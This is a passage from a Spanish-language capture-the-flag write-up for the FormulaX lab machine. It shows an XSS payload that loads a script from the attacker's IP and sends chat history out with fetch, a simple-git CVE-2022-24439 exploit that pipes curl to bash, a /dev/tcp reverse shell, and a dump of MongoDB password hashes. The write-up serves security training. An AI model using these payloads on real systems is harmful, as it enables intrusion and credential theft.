</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;big_container&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// send the input to the chat forum
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>const</span> <span class=nx>Show_messages_on_screen_of_Client</span> <span class=o>=</span> <span class=p>(</span><span class=nx>value</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span> <span class=o>=</span> <span class=nx>htmlEncode</span><span class=p>(</span><span class=nx>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>div</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;container&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>classList</span><span class=p>.</span><span class=nx>add</span><span class=p>(</span><span class=s1>&#39;darker&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>div</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`  
</span></span></span><span class=line><span class=cl><span class=sb>  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
</span></span></span><span class=line><span class=cl><span class=sb>      &lt;p&gt;</span><span class=si>${</span><span class=nx>value</span><span class=si>}</span><span class=sb>&lt;/p&gt;
</span></span></span><span class=line><span class=cl><span class=sb>  `</span>
</span></span><span class=line><span class=cl>  <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;big_container&#39;</span><span class=p>).</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>div</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>tenemos c√≥mo se procesan los mensajes para el bot.</p><ul><li>El segundo script, <code>chat.js</code>, se ve interesante dado que est√° haciendo una petici√≥n al endpoint API <code>/user/api/chat</code>. Adicionalmente, si interceptamos con <code>Burpsuite</code> qu√© es lo que env√≠a la petici√≥n al servidor v√≠ctima cuando le damos una orden al bot de la p√°gina web tenemos lo siguiente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/socket.io/?EIO=4&amp;transport=polling&amp;t=O-U2x4Z</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.6/restricted/chat.html</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjRkNTJhOTY2Nzg2M2QwYTNmYjhkMDYiLCJpYXQiOjE3MTYzNDM0NzV9._-XmykICwd7YdKAVfT9NyuKr64XofXHrFc5VqXH3fyw</span>
</span></span></code></pre></div><p>donde veo que realiza una petici√≥n al directorio <code>/socket.io</code>.</p><ul><li>Buscando por <code>What is socket.io?</code> (<code>¬øqu√© es socket.io?</code>) en Google tenemos:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content>Socket.IO is a library that enables low-latency, bidirectional and event-based communication between a client and a server.</div></div>donde, b√°sicamente, <code>Socket.IO</code> es un programa para &ldquo;mediar&rdquo; entre el frontend y el backend del servidor.</li></ul><p>De la <a href=https://socket.io/docs/v2/#minimal-working-example class=external-link target=_blank rel=noopener>documentaci√≥n de Socket.io</a>, en el ejemplo de un archivo <code>index.html</code>, podemos ver que est√° haciendo una petici√≥n al archivo ubicado en: <code>/socket.io/socket.io.js</code>.</p><ul><li>Podemos verificar que este archivo existe en el servidor web <code>http://10.10.11.6/socket.io/socket.io.js</code> usando <code>cURL</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.10.11.6/socket.io/socket.io.js | head
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/*!
</span></span></span><span class=line><span class=cl><span class=go> * Socket.IO v4.7.1
</span></span></span><span class=line><span class=cl><span class=go> * (c) 2014-2023 Guillermo Rauch
</span></span></span><span class=line><span class=cl><span class=go> * Released under the MIT License.
</span></span></span><span class=line><span class=cl><span class=go> */
</span></span></span><span class=line><span class=cl><span class=go>(function (global, factory) {
</span></span></span><span class=line><span class=cl><span class=go>  typeof exports === &#39;object&#39; &amp;&amp; typeof module !== &#39;undefined&#39; ? module.exports = factory() :
</span></span></span><span class=line><span class=cl><span class=go>  typeof define === &#39;function&#39; &amp;&amp; define.amd ? define(factory) :
</span></span></span><span class=line><span class=cl><span class=go>  (global = typeof globalThis !== &#39;undefined&#39; ? globalThis : global || self, global.io = factory());
</span></span></span><span class=line><span class=cl><span class=go>})(this, (function () { &#39;use strict&#39;;
</span></span></span></code></pre></div><ul><li>Con toda esta data recolectada podemos entonces de leer la data del servidor. Para ello creamos un script malicioso de <code>JavaScript</code> el cual recibe el mensaje del servidor y lo encodea a <code>base64</code>; todo esto bas√°ndonos en el c√≥digo original del archivo <code>chat.js</code> hallado previamente:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>script</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;script&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;/socket.io/socket.io.js&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>script</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>script</span><span class=p>.</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s1>&#39;load&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>res</span> <span class=o>=</span> <span class=nx>axios</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=sb>`/user/api/chat`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>socket</span> <span class=o>=</span> <span class=nx>io</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,{</span><span class=nx>withCredentials</span><span class=o>:</span><span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=nx>socket</span><span class=p>.</span><span class=nx>on</span><span class=p>(</span><span class=s1>&#39;message&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>my_message</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://10.10.16.2:8000/?d=&#34;</span> <span class=o>+</span> <span class=nx>btoa</span><span class=p>(</span><span class=nx>my_message</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>socket</span><span class=p>.</span><span class=nx>emit</span><span class=p>(</span><span class=s1>&#39;client_message&#39;</span><span class=p>,</span> <span class=s1>&#39;history&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>y guardamos este archivo como <code>exploit.js</code>.</p><ul><li>Empiezo otro servidor <code>Python</code> <code>HTTP</code>, pero ahora en el puerto <code>8000</code> donde se encuentra ubicado el archivo <code>exploit.js</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>exploit.js
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span></code></pre></div><ul><li>En la p√°gina web de la m√°quina v√≠ctima, vuelvo a la p√°gina de <code>Contact Us</code>, relleno el formulario, y antes de enviarlo intercepto la petici√≥n con <code>Burpsuite</code>. Env√≠o esta petici√≥n al <code>Repeater</code> (<code>Ctrl+R</code>). Luego, env√≠o la siguiente petici√≥n <code>HTTP</code> con <code>Burpsuite</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/user/api/contact_us</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>application/json, text/plain, */*</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>168</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.6</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.6/restricted/contact_us.html</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>authorization=Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjRkNTVmZjY2Nzg2M2QwYTNmYjk0OTgiLCJpYXQiOjE3MTYzNDQzMzh9.Luv5ZIi-x48Bwf1cTRpJD2KQSwqGOeO-g0jwxtfj-Rk</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;first_name&#34;</span><span class=p>:</span><span class=s2>&#34;John&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;last_name&#34;</span><span class=p>:</span><span class=s2>&#34;Wick&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=nt>&#34;message&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;img src=x onerror=\&#34;with(top)body.appendChild (createElement(&#39;script&#39;)).src=&#39;http://10.10.16.2:8000/exploit.js&#39;\&#34;&gt;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>donde, de nuevo, <code>10.10.16.2</code> es mi IP de atacante. Aqu√≠ la parte importante se encuentra en el par√°metro <code>message</code>, dado que lleva el payload basado en la estructura del archivo <code>chat.js</code>.</p><div class="notice warning"><div class=notice-title><i class="fa-solid fa-exclamation-triangle" aria-hidden=true></i>Advertencia</div><div class=notice-content>Noto que en el √∫ltimo request la cookie ha cambiado. Esto porque me doy cuenta de que el usuario que nos hab√≠amos creado previamente ya no existe; de manera que √©ste pudo haber sido removido del sistema. Es posible que nos tengamos que volver a crear un usuario.</div></div><ul><li>Luego de enviar el payload, obtengo algo en mi servidor temporal:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>exploit.js
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;GET /exploit.js HTTP/1.1&#34; 200 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1&#34; 501 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1&#34; 501 -
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] code 501, message Unsupported method (&#39;OPTIONS&#39;)
</span></span></span><span class=line><span class=cl><span class=go>10.10.11.6 - - [21/May/2024 22:19:52] &#34;OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1&#34; 501 -
</span></span></span></code></pre></div><ul><li>Decodeando estos mensajes, tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg==&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Hello, I am Admin.Testing the Chat Application%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Write a script for  dev-git-auto-update.chatbot.htb to work properly%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Write a script to automate the auto-update%
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ echo -n &#39;TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Message Sent:&lt;br&gt;history
</span></span></span></code></pre></div><ul><li>De aqu√≠ puedo ver un nuevo subdominio: <code>dev-git-auto-update.chatbot.htb</code>. Decido agregar este nuevo subdominio a mi archivo <code>/etc/hosts</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.6 dev-git-auto-update.chatbot.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><ul><li>Visitando <code>http://dev-git-auto-update.chatbot.htb</code> muestra una nueva p√°gina:</li></ul><p><img alt="FormulaX 5" src=/pentesting/images/FormulaX_5.png></p><p>donde, en la parte inferior de √©sta, puedo leer el texto <code>Made with ‚ù§ by Chatbot Using simple-git v3.14</code>.</p><ul><li>Bucando por exploits de <code>simple-git</code> para esta versi√≥n encontramos <a href=https://github.com/gitpython-developers/GitPython/issues/1515 class=external-link target=_blank rel=noopener>este Issue en Github</a>, basado en <a href=https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 class=external-link target=_blank rel=noopener>este reporte</a> la cual tambi√©n provee un Proof of Concept de una vulnerabilidad catalogada como <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-24439 class=external-link target=_blank rel=noopener>CVE-2022-24439</a>. Esta vulnerabilidad nos permite un <code>Remote Code Execution</code> (ejecuci√≥n remota de comandos). B√°sicamente, basados en el PoC dado, podr√≠amos intentar:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ext::sh -c touch% /tmp/pwned
</span></span></span></code></pre></div><p>para crear un archivo llamado <code>/tmp/pwned</code> en la m√°quina v√≠ctima.</p><ul><li>Podemos adaptar el PoC. Para ello crear√© un archivo llamado <code>rev.sh</code> en mi m√°quina de atacante con el contenido:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>donde, de nuevo, <code>10.10.16.2</code> es mi IP de atacante y <code>443</code> es el puerto en el cual me pondr√© en escucha con <code>nc</code>. Adem√°s, el asigno permisos de ejecuci√≥n con <code>chmod +x rev.sh</code>. Expongo este archivo seteando nuevamente un servidor <code>Python</code> <code>HTTP</code> en el puerto <code>8000</code> (<code>python3 -m http.server 8000</code>) y corro en la p√°gina que se encuentra en desarrollo <code>http://dev-git-auto-update.chatbot.htb</code> el comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ext::sh -c curl% http://10.10.16.2/rev.sh|bash
</span></span></span></code></pre></div><p>Donde antes de pasar el comando, empiezo un listener con <code>netcat</code> en el puerto <code>443</code>. Paso entonces el comando en la p√°gina web como se muestra a continuaci√≥n:</p><p><img alt="FormulaX 6" src=/pentesting/images/FormulaX_6.png></p><p>y obtengo una shell como <code>www-data</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 38452
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1164): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>www-data
</span></span></span></code></pre></div><ul><li>Revisando por puertos internos abiertos en la m√°quina v√≠ctima, noto que el puerto <code>27017</code> est√° expuesto luego de correr:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ ss -ntlp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>State         Recv-Q        Send-Q               Local Address:Port                 Peer Address:Port        Process
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                        0.0.0.0:80                        0.0.0.0:*            users:((&#34;nginx&#34;,pid=954,fd=7),(&#34;nginx&#34;,pid=953,fd=7))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8081                      0.0.0.0:*            users:((&#34;node /var/www/g&#34;,pid=1164,fd=20))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8082                      0.0.0.0:*            users:((&#34;node /var/www/a&#34;,pid=1163,fd=19))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             4096                 127.0.0.53%lo:53                        0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             128                        0.0.0.0:22                        0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:3000                      0.0.0.0:*            users:((&#34;nginx&#34;,pid=954,fd=6),(&#34;nginx&#34;,pid=953,fd=6))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             511                      127.0.0.1:8000                      0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             10                       127.0.0.1:46465                     0.0.0.0:*            users:((&#34;chrome&#34;,pid=1263,fd=45))
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             4096                     127.0.0.1:27017                     0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             80                       127.0.0.1:3306                      0.0.0.0:*
</span></span></span><span class=line><span class=cl><span class=go>LISTEN        0             128                           [::]:22                           [::]:*
</span></span></span></code></pre></div><p>el cual es el puerto por defecto para <code>MongoDB</code>. Podemos interactuar con la base de datos corriendo el comando <code>mongo --shell</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ mongo --shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>MongoDB shell version v4.4.29
</span></span></span><span class=line><span class=cl><span class=go>connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb
</span></span></span><span class=line><span class=cl><span class=go>Implicit session: session { &#34;id&#34; : UUID(&#34;d6df1c53-2af2-4f5d-8b1e-e9fb5c903c56&#34;) }
</span></span></span><span class=line><span class=cl><span class=go>MongoDB server version: 4.4.8
</span></span></span><span class=line><span class=cl><span class=go>type &#34;help&#34; for help
</span></span></span><span class=line><span class=cl><span class=go>Welcome to the MongoDB shell.
</span></span></span><span class=line><span class=cl><span class=go>For interactive help, type &#34;help&#34;.
</span></span></span><span class=line><span class=cl><span class=go>For more comprehensive documentation, see
</span></span></span><span class=line><span class=cl><span class=go>        https://docs.mongodb.com/
</span></span></span><span class=line><span class=cl><span class=go>Questions? Try the MongoDB Developer Community Forums
</span></span></span><span class=line><span class=cl><span class=go>        https://community.mongodb.com
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>The server generated these startup warnings when booting:
</span></span></span><span class=line><span class=cl><span class=go>        2024-05-20T18:10:37.949+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
</span></span></span><span class=line><span class=cl><span class=go>        2024-05-20T18:10:40.991+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>&gt;</span>
</span></span></code></pre></div><ul><li>Una vez dentro, puedo ver una database llamada <code>testing</code>, con una tabla llamada <code>users</code>. Si vemos qu√© es lo que √©sta contiene tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>&gt;</span> use testing
</span></span><span class=line><span class=cl><span class=go> 
</span></span></span><span class=line><span class=cl><span class=go>switched to db testing
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>&gt;</span> show tables
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>messages
</span></span></span><span class=line><span class=cl><span class=go>users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>&gt;</span> db.users.find<span class=o>()</span>.pretty<span class=o>()</span>
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>        &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457c&#34;),
</span></span></span><span class=line><span class=cl><span class=go>        &#34;name&#34; : &#34;admin&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;email&#34; : &#34;admin@chatbot.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;password&#34; : &#34;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;terms&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;value&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;authorization_token&#34; : &#34;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTYzNDY5MDN9.LAXwL7wyyZ4mniyMYHIZ0mGr4c6uCCxZBd5Hd7XBiWo&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;__v&#34; : 0
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span><span class=line><span class=cl><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>        &#34;_id&#34; : ObjectId(&#34;648874de313b8717284f457d&#34;),
</span></span></span><span class=line><span class=cl><span class=go>        &#34;name&#34; : &#34;frank_dorky&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;email&#34; : &#34;frank_dorky@chatbot.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;password&#34; : &#34;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;terms&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;value&#34; : true,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;authorization_token&#34; : &#34; &#34;,
</span></span></span><span class=line><span class=cl><span class=go>        &#34;__v&#34; : 0
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>Aqu√≠ puedo ver 2 usuarios con su hash de contrase√±a: <code>admin</code> y <code>frank_dorky</code></p><ul><li>Noto que el usuario <code>frank_dorky</code> existe en la m√°quina v√≠ctima:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@formulax:~/git-auto-update$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>frank_dorky  kai_relay
</span></span></span></code></pre></div><ul><li>Guardo ambos hashes en un archivo llamado <code>found_hashes</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat found_hashes
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>admin:$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.
</span></span></span><span class=line><span class=cl><span class=go>frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
